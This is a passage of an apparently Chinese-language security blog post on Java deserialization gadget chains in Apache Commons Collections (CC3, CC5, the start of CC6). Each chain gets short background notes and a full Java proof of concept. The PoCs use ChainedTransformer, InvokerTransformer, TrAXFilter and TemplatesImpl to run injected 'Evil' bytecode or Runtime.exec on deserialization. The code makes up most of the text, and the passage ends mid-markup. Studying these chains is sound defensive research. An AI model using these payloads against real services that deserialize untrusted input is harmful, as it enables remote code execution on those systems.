<span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Repeatable.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocationHandler;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a><font style="color:rgb(0, 0, 0);">TrAXFilter</font></h4><p>在SAX API中提供了一个过滤器接口org.xml.sax.XMLFilter，XMLFilterImpl是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承XMLFilterImpl，就可以方便的实现自己的功能。com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter是对XMLFilterImpl的实现，在其基础上扩展了Templates&#x2F;TransformerImpl&#x2F;TransformerHandlerImpl属性。同时，TrAXFilter在实例化时接收Templates对象，并会调用其newTransformer方法，利用该点，便可以触发TemplatesImpl的攻击链。</p><p><img src="/2023/04/23/CommonsCollections/1708878602022-ec0c48c3-2b9e-4164-a4f4-bc0dd9567542.png"></p><h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a><font style="color:rgb(0, 0, 0);">InstantiateTransformer</font></h4><p>在Commons Collections中提供了<font style="color:#080808;">org.apache.commons.collections.functors.</font>InstantiateTransformer类用来通过反射创建类的实例，可以看到InstantiateTransformer#transform方法接收一个Class类型的对象，通过getConstructor获取构造方法，并通过newInstance创建类实例。</p><p>同时，反射所需要的参数iParamTypes和iArgs可以在InstantiateTransformer初始化时进行赋值。</p><p><img src="/2023/04/23/CommonsCollections/1708879007378-186ae50c-871a-4bde-a1bc-03d3dd651ac3.png"></p><h3 id="利用构造-1"><a href="#利用构造-1" class="headerlink" title="利用构造"></a>利用构造</h3><p>利用AnnotationInvocationHandler在反序列化时会触发Map的get&#x2F;set等操作，配合LazyMap在执行Map对象的操作时会根据不同情况调用Transformer的转换方法，利用了InstantiateTransformer实例化TrAXFilter类，并调用TemplatesImpl的newTransformer方法实例化恶意类字节码触发漏洞。</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonscollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Repeatable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">CommonsCollections3</span> <span class="variable">commonsCollections3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections3</span>();</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">lazyMapChain</span> <span class="operator">=</span> commonsCollections3.LazyMapChain();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(lazyMapChain);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> InvocationHandler <span class="title function_">LazyMapChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;getTemplates()&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Repeatable.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Repeatable.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocationHandler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Templates <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/23/CommonsCollections/1708882695567-6c2d958f-6d41-465d-ac11-4bd14b38f95e.png"></p><h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><h3 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a><font style="color:rgb(0, 0, 0);">TiedMapEntry</font></h4><p>org.apache.commons.collections.keyvalue.TiedMapEntry是一个Map.Entry的实现类，这是一个绑定了底层map的Entry，用来使一个map entry对象拥有在底层修改map的功能。</p><p>TiedMapEntry中有一个成员属性Map，这就是Map.Entry的底层map，TiedMapEntry#getValue方法会调用底层map#get方法，可以用来触发LazyMap#get。同时，TiedMapEntry类中的equals&#x2F;hashCode&#x2F;toString方法都可以触发TiedMapEntry#getValue方法。</p><p>对于equals&#x2F;hashCode方法，可以利用URLDNS链的HashMap，只不过在CommonsCollections5链中，利用的是toString方法，这就需要找到一个类在反序列化时会触发TiedMapEntry#toString方法。</p><p><img src="/2023/04/23/CommonsCollections/1708891587535-a13597ef-b44f-4ac3-93af-99e4beeb0339.png"></p><h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a><font style="color:rgb(0, 0, 0);">BadAttributeValueExpException</font></h4><p>javax.management.BadAttributeValueExpException类在反序列化读取val时，如果System.getSecurityManager() &#x3D;&#x3D; null或valObj是除了String的其他基础类型，则会调用valObj的toString方法，从而完成TiedMapEntry的构造。</p><p><img src="/2023/04/23/CommonsCollections/1708891677688-67e3c324-9231-4b9b-9a0e-5208a3688765.png"></p><h3 id="利用构造-2"><a href="#利用构造-2" class="headerlink" title="利用构造"></a>利用构造</h3><p>利用TiedMapEntry和BadAttributeValueExpException作为触发点，配合LazyMap就可以完成一条新的攻击路径。这里可以使用ChainedTransformer + InvokerTransformer的方式，也可以使用InvokerTransformer + TemplatesImpl&#x2F;TrAXFilter + InstantiateTransformer + TemplatesImpl的方式触发。</p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonscollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">CommonsCollections5</span> <span class="variable">commonsCollections5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections5</span>();</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">lazyMapChain</span> <span class="operator">=</span> commonsCollections5.LazyMapChain2();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(lazyMapChain);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">LazyMapChain1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, tiedMapEntry);</span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">LazyMapChain2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, tiedMapEntry);</span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/23/CommonsCollections/1708961067196-18638dd2-0f45-490c-9aa6-b296fda9b83f.png"></p><h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><h3 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h4><p>HashSet是一个无序且不允许有重复元素的集合，其本质上就是由HashMap实现的。HashSet中的元素都存放在HashMap的key上面，而value中的值都是统一的一个private static final Object PRESENT &#x3D; new Object();。HashSet跟HashMap一样，都是一个存放链表的数组。</p><p>在HashSet的readObject方法中，会调用其内部HashMap的put方法，将值放在key上。</p><p><img src="/2023/04/23/CommonsCollections/1708960227864-45a11fc1-2e99-44ce-95b2-7d572b157d86.png"></p><h3 id="利用构造-3"><a href="#利用构造-3" class="headerlink" title="利用构造"></a>利用构造</h3><p>在高版本Java中，官方修改了AnnotationInvocationHandler的readObject方法，导致CC1无法在高版本的使用，CC6解决了高版本中CC链中利用的问题。</p><p>这里可以采用两种方式，第一种是利用HashMap来触发，第二种是利用HashSet来触发。</p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 